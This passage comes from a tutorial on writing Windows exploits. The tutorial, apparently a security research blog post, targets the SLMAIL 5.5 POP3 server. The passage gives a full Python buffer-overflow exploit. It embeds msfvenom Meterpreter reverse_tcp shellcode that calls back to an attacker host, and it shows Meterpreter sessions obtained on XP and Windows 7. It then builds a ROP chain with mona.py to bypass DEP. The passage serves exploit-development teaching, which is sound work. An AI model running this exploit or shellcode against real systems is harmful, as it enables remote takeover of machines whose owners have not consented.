data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?fit=886%2C226&amp;ssl=1" loading="lazy" width="886" height="226" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?resize=886%2C226&#038;ssl=1" alt="" class="wp-image-7756" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?w=886&amp;ssl=1 886w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?resize=300%2C77&amp;ssl=1 300w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/20.png?resize=768%2C196&amp;ssl=1 768w" sizes="(max-width: 886px) 100vw, 886px" data-recalc-dims="1" /></noscript></figure>



<p>objdump finds multiple jmp esp instructions. Just to make sure, in Immunity Debugger we tried to go to the address 0x5f4a358f and watch which instructions are there.</p>



<p>Just right-click in the instructions windows, and choose “Go To -&gt; Expression” in the pop-up menu. Then put the memory address in the expression form and click “OK”.</p>



<p>This was the result</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7757" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/21/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?fit=370%2C130&amp;ssl=1" data-orig-size="370,130" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="21" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?fit=300%2C105&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?fit=370%2C130&amp;ssl=1" loading="lazy" width="370" height="130" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?resize=370%2C130&#038;ssl=1" alt class="wp-image-7757 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?w=370&amp;ssl=1 370w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?resize=300%2C105&amp;ssl=1 300w" data-lazy-sizes="(max-width: 370px) 100vw, 370px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?resize=370%2C130&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7757" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/21/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?fit=370%2C130&amp;ssl=1" data-orig-size="370,130" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="21" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?fit=300%2C105&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?fit=370%2C130&amp;ssl=1" loading="lazy" width="370" height="130" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?resize=370%2C130&#038;ssl=1" alt="" class="wp-image-7757" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?w=370&amp;ssl=1 370w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/21.png?resize=300%2C105&amp;ssl=1 300w" sizes="(max-width: 370px) 100vw, 370px" data-recalc-dims="1" /></noscript></figure></div>



<p>The instruction “jmp esp” was in the SLMFC module, which was compiled with no ASLR and no Rebase.</p>



<p>Once the exploit is modified with this jump instruction, the exploit should look like this:</p>



<pre class="wp-block-code"><code>import sys
import socket
import struct

eip_offset = 4654
edx_offset = 5082
buff_size = 6000

#0x5f4a358f : # JMP ESP  &#91;SLMFC.DLL]
EIP=struct.pack(&lt;I,0x5f4a358f)
move_esp = \x81\xc4\xc0\xfd\xff\xff # add esp,-240h

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.65.159 LPORT=6969 EXITFUNC=thread -b \x00\x0a\x0d -f c
# x86/shikata_ga_nai succeeded with size 347 (iteration=0)
shellcode = (
\xb8\x90\x7d\x06\xa3\xdd\xc5\xd9\x74\x24\xf4\x5d\x33\xc9\xb1
\x51\x31\x45\x12\x03\x45\x12\x83\x55\x79\xe4\x56\xa9\x6a\x6a
\x98\x51\x6b\x0b\x10\xb4\x5a\x0b\x46\xbd\xcd\xbb\x0c\x93\xe1
\x30\x40\x07\x71\x34\x4d\x28\x32\xf3\xab\x07\xc3\xa8\x88\x06
\x47\xb3\xdc\xe8\x76\x7c\x11\xe9\xbf\x61\xd8\xbb\x68\xed\x4f
\x2b\x1c\xbb\x53\xc0\x6e\x2d\xd4\x35\x26\x4c\xf5\xe8\x3c\x17
\xd5\x0b\x90\x23\x5c\x13\xf5\x0e\x16\xa8\xcd\xe5\xa9\x78\x1c
\x05\x05\x45\x90\xf4\x57\x82\x17\xe7\x2d\xfa\x6b\x9a\x35\x39
\x11\x40\xb3\xd9\xb1\x03\x63\x05\x43\xc7\xf2\xce\x4f\xac\x71
\x88\x53\x33\x55\xa3\x68\xb8\x58\x63\xf9\xfa\x7e\xa7\xa1\x59
\x1e\xfe\x0f\x0f\x1f\xe0\xef\xf0\x85\x6b\x1d\xe4\xb7\x36\x4a
\xc9\xf5\xc8\x8a\x45\x8d\xbb\xb8\xca\x25\x53\xf1\x83\xe3\xa4
\xf6\xb9\x54\x3a\x09\x42\xa5\x13\xce\x16\xf5\x0b\xe7\x16\x9e
\xcb\x08\xc3\x31\x9b\xa6\xbc\xf1\x4b\x07\x6d\x9a\x81\x88\x52
\xba\xaa\x42\xfb\x51\x51\x05\xc4\x0e\x18\x4a\xac\x4c\x9a\x6f
\x14\xd8\x7c\xe5\x76\x8c\xd7\x92\xef\x95\xa3\x03\xef\x03\xce
\x04\x7b\xa6\x2f\xca\x8c\xc3\x23\x3b\xb3\x2b\xbb\xbc\xa6\x2b
\xd1\xb8\x60\x7b\x4d\xc3\x55\x4b\xd2\x3c\xb0\xcf\x14\xc2\x45
\x39\x6f\xf5\xd3\xf9\x07\xfa\x33\xfa\xd7\xac\x59\xfa\xbf\x08
\x3a\xa9\xda\x56\x97\xdd\x77\xc3\x18\xb4\x24\x44\x71\x3a\x13
\xa2\xde\xc5\x76\xb0\x19\x39\x06\x74\xd8\xf9\xdf\xbc\xae\x14
\xdc\xfa\xb1\xfa\xc8\xf6\x59\xa3\x99\xba\x07\x54\x74\xf8\x31
\xd7\x7c\x81\xc5\xc7\xf5\x84\x82\x4f\xe6\xf4\x9b\x25\x08\xaa
\x9c\x6f
)
 
buffer = 'A' * eip_offset
buffer += EIP
buffer += move_esp
buffer += shellcode
buffer += 'C' * (buff_size - len(buffer))
 
HOST = '127.0.0.1'
PORT = 110
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)
print 'Received', repr(data)
s.send('USER username'+'\r\n')
data = s.recv(1024)
print 'Received', repr(data)
s.send('PASS ' + buffer + '\r\n')
s.close()</code></pre>



<p>We then launch the exploit against the two Windows boxes to check it works on XP and on Win7.</p>



<p>First we configured the handler to not exit after a session is acquired, and to run it as a job:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7758" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/22/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?fit=863%2C564&amp;ssl=1" data-orig-size="863,564" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="22" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?fit=300%2C196&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?fit=863%2C564&amp;ssl=1" loading="lazy" width="863" height="564" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?resize=863%2C564&#038;ssl=1" alt class="wp-image-7758 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?w=863&amp;ssl=1 863w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?resize=300%2C196&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?resize=768%2C502&amp;ssl=1 768w" data-lazy-sizes="(max-width: 863px) 100vw, 863px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?resize=863%2C564&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7758" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/22/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?fit=863%2C564&amp;ssl=1" data-orig-size="863,564" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="22" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?fit=300%2C196&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?fit=863%2C564&amp;ssl=1" loading="lazy" width="863" height="564" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?resize=863%2C564&#038;ssl=1" alt="" class="wp-image-7758" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?w=863&amp;ssl=1 863w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?resize=300%2C196&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/22.png?resize=768%2C502&amp;ssl=1 768w" sizes="(max-width: 863px) 100vw, 863px" data-recalc-dims="1" /></noscript></figure>



<p>Then the exploit was slightly modified to take the target IP from the command line. Here is what was changed:</p>



<pre class="wp-block-code"><code>- HOST = ‘127.0.0.1’
+ HOST = sys.argv&#91;1]</code></pre>



<p>Here are some screenshots showing what happened.</p>



<p>First the exploit launched against both boxes:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7759" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/23/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?fit=777%2C147&amp;ssl=1" data-orig-size="777,147" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="23" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?fit=300%2C57&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?fit=777%2C147&amp;ssl=1" loading="lazy" width="777" height="147" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?resize=777%2C147&#038;ssl=1" alt class="wp-image-7759 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?w=777&amp;ssl=1 777w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?resize=300%2C57&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?resize=768%2C145&amp;ssl=1 768w" data-lazy-sizes="(max-width: 777px) 100vw, 777px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?resize=777%2C147&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7759" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/23/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?fit=777%2C147&amp;ssl=1" data-orig-size="777,147" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="23" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?fit=300%2C57&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?fit=777%2C147&amp;ssl=1" loading="lazy" width="777" height="147" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?resize=777%2C147&#038;ssl=1" alt="" class="wp-image-7759" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?w=777&amp;ssl=1 777w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?resize=300%2C57&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/23.png?resize=768%2C145&amp;ssl=1 768w" sizes="(max-width: 777px) 100vw, 777px" data-recalc-dims="1" /></noscript></figure>



<p>And here are the received Meterpreter sessions:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7760" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/24/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?fit=984%2C143&amp;ssl=1" data-orig-size="984,143" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="24" data-image-description data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?fit=300%2C44&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?fit=984%2C143&amp;ssl=1" loading="lazy" width="984" height="143" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?resize=984%2C143&#038;ssl=1" alt class="wp-image-7760 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?w=984&amp;ssl=1 984w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?resize=300%2C44&amp;ssl=1 300w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?resize=768%2C112&amp;ssl=1 768w" data-lazy-sizes="(max-width: 984px) 100vw, 984px" data-lazy-src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?resize=984%2C143&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7760" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/24/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?fit=984%2C143&amp;ssl=1" data-orig-size="984,143" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="24" data-image-description="" data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?fit=300%2C44&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?fit=984%2C143&amp;ssl=1" loading="lazy" width="984" height="143" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?resize=984%2C143&#038;ssl=1" alt="" class="wp-image-7760" srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?w=984&amp;ssl=1 984w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?resize=300%2C44&amp;ssl=1 300w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/24.png?resize=768%2C112&amp;ssl=1 768w" sizes="(max-width: 984px) 100vw, 984px" data-recalc-dims="1" /></noscript></figure>



<figure class="wp-block-image size-large"><img data-attachment-id="7761" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/25/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?fit=1164%2C595&amp;ssl=1" data-orig-size="1164,595" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="25" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?fit=300%2C153&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?fit=1024%2C523&amp;ssl=1" loading="lazy" width="1024" height="523" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?resize=1024%2C523&#038;ssl=1" alt class="wp-image-7761 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?resize=1024%2C523&amp;ssl=1 1024w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?resize=300%2C153&amp;ssl=1 300w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?resize=768%2C393&amp;ssl=1 768w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?resize=1100%2C562&amp;ssl=1 1100w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?w=1164&amp;ssl=1 1164w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?resize=1024%2C523&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7761" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/attachment/25/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?fit=1164%2C595&amp;ssl=1" data-orig-size="1164,595" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="25" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?fit=300%2C153&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?fit=1024%2C523&amp;ssl=1" loading="lazy" width="1024" height="523" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?resize=1024%2C523&#038;ssl=1" alt="" class="wp-image-7761" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?resize=1024%2C523&amp;ssl=1 1024w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?resize=300%2C153&amp;ssl=1 300w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?resize=768%2C393&amp;ssl=1 768w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?resize=1100%2C562&amp;ssl=1 1100w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/25.png?w=1164&amp;ssl=1 1164w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1" /></noscript></figure>



<p>We have a reliable exploit for Windows XP and Windows 7 with DEP configured with the Optin (default) option.</p>



<p>This is because we are using an instruction from a module that installs with the SLMAIL server (SLMFC.DLL) to make the jump to the ESP register. This module should be the same in SLMAIL 5.5 across all Windows platforms.</p>



<h2>Bypass DEP on Windows 7</h2>



<p>Like in Windows XP, DEP on Windows 7 is OptIn by default. To change this setting and activate DEP for all processes, we can use a privileged command prompt to type:</p>



<pre class="wp-block-code"><code>bcdedit.exe /set nx AlwaysOn</code></pre>



<p>After this, you need to restart the box.</p>



<p>To bypass DEP, we use ROP as on Windows XP.</p>



<p>The first step is to use mona.py to find gadgets and rop chains using modules with no ASLR and no Rebase.</p>



<pre class="wp-block-code"><code>!mona rop -m mfc42loc.dll,slmfc.dll,Openc32.dll -cpb '\x00\x0a\x0d'</code></pre>



<p>Looking at the file rop_chains.txt we see chains to VirtualProtect and VirtualAlloc. The VirtualProtect chain is 600 bytes in length, too big for the space we have on the exploit (430 bytes). The VirtualAlloc one is smaller (96 bytes), but it is not complete because mona.py did not find a pointer to VirtualAlloc and did not find a gadget to put 0x1000 into EDX on any of the modules used to create the chains.</p>



<p>Here is the chain.</p>



<pre class="wp-block-code"><code>  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = &#91;
      0x00000000,  # &#91;-] Unable to find API pointer -&gt; ecx
      0x5f473b6b,  # MOV EAX,DWORD PTR DS:&#91;ECX] # RETN &#91;SLMFC.DLL]
      0x5f468e7b,  # PUSH EAX # PUSHAD # POP ESI # RETN &#91;SLMFC.DLL]
      0x5f45dfd5,  # POP EAX # RETN &#91;SLMFC.DLL]
      0x7ffbff9c,  # put delta into eax (-&gt; put 0x00000000 into ebp)
      0x5f47fc0f,  # ADD EAX,80040064 # RETN 0x08 &#91;SLMFC.DLL]
      0x5f48d2d5,  # XCHG EAX,EBP # RETN &#91;SLMFC.DLL]
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x5f4731a7,  # POP EAX # RETN &#91;SLMFC.DLL]
      0xffffffff,  # Value to negate, will become 0x00000001
      0x5f465969,  # NEG EAX # RETN &#91;SLMFC.DLL]
      0x5f4503e7,  # PUSH EAX # ADD AL,5E # POP EBX # RETN &#91;SLMFC.DLL]
      0x00000000,  # &#91;-] Unable to find gadget to put 00001000 into edx
      0x5f418e3c,  # POP EAX # RETN &#91;SLMFC.DLL]
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x5f465969,  # NEG EAX # RETN &#91;SLMFC.DLL]
      0x5f4864b7,  # XCHG EAX,ECX # DEC EAX # POP EDI # RETN &#91;SLMFC.DLL]
      0x41414141,  # Filler (compensate)
      0x5f469c12,  # POP EDI # RETN &#91;SLMFC.DLL]
      0x5f445804,  # RETN (ROP NOP) &#91;SLMFC.DLL]
      0x5f41909a,  # POP EAX # RETN &#91;SLMFC.DLL]
      0x90909090,  # nop
      0x5f495b3d,  # PUSHAD # RETN &#91;SLMFC.DLL]
    ]
    return ''.join(struct.pack('&lt;I', _) for _ in rop_gadgets)</code></pre>



<p>Even if mona.py could not find valid gadgets to make the chain, that doesn’t mean the chain cannot be generated. Let’s try to generate our own rop chain with VirtualAlloc to make our exploit work.</p>



<p>To call VirtualAlloc, we need to set up the stack as follows:</p>



<figure class="wp-block-table"><table><tbody><tr><td>Ptr to VirtualAlloc</td></tr><tr><td>returnTo (address where VirtualAlloc returns)</td></tr><tr><td>lpAddress (address where starts the memory allocation)</td></tr><tr><td>dwsize (0x1)</td></tr><tr><td>fAllocationType (0x1000)</td></tr><tr><td>flProtect (0x40)</td></tr></tbody></table></figure>



<p>To find a pointer to VirtualAlloc we can try to find a pointer from SLMFC.DLL to another module containing a pointer to the API. To help with this, mona.py has the command ropfunc.</p>



<p>We use ropfunc with the non-ASLR modules and excluding the bad chars:</p>



<pre class="wp-block-code"><code>!mona ropfunc -m mfc42loc.dll,slmfc.dll,Openc32.dll -cpb '\x00\x0a\x0d'</code></pre>



<p>The command generates the files ropfunc.txt and ropfunc_offsets.txt.&nbsp; In ropfunc.txt there should be a list of pointers to interesting functions that can help bypass DEP. In ropfunc_offsets.txt there should be pointers to functions in modules which had pointers to VirtualAlloc, VirtualProtect, or other API functions to change or disable DEP.</p>



<p>Here is an example of ropfunc_offset.txt. There are plenty of valid pointers, so we take one with a small negative offset:</p>



<pre class="wp-block-code"><code>0x5f49a1cc : (SLMFC.DLL - IAT 0x5f49a1cc : kernel32.dll.kernel32!multibytetowidechar (0x750b18fe), offset to kernel32.dll.virtualalloc (0x750b1826) : -216 (-0x00000d8) |  {PAGE_READONLY} &#91;SLMFC.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.8063.0 (C:\Windows\system32\SLMFC.DLL)</code></pre>



<p>From that line we know that in 0x5f49a1cc there is a pointer to a pointer that points to the function multibytetowidehchar in the kernel32.dll module, and that pointer is at an offset of -216 bytes from a pointer to the VirtualAlloc function in the same module.</p>



<p>To obtain a pointer to VirtualAlloc on ecx we can do something like this:</p>



<pre class="wp-block-code"><code>move      ecx,0x5f49a1cc    # put the pointer to pointer to multibytetowidechar on ecx
move      ecx,&#91;ecx]                # get the address on memory of the pointer to multibytetowidechar
sub         ecx,0x00000d8    # add/sub the offset to get the address of the pointer to VirtualAlloc</code></pre>



<p>So our goal now is to set up the stack as we saw in the previous table, with ESP pointing to the pointer to VirtualAlloc, and put a RET instruction into EIP.</p>



<p>First let’s set up the stack using the gadgets in rop.txt and rop_suggestions.txt.</p>



<p>We save ESP (stack pointer) in ECX and use it to store values on the stack:</p>



<pre class="wp-block-code"><code>#--- Save ESP into ECX
0x5f42F7dc,         # PUSH ESP # INC ESI # ADD DWORD PTR DS:&#91;EAX],EAX # POP ECX # MOV EAX,ESI # POP ESI # RETN 0x04
0x41414141,        # to pop esi
0x5f4011f2,          # RET
0x41414141,        # compensate retn 0x04</code></pre>



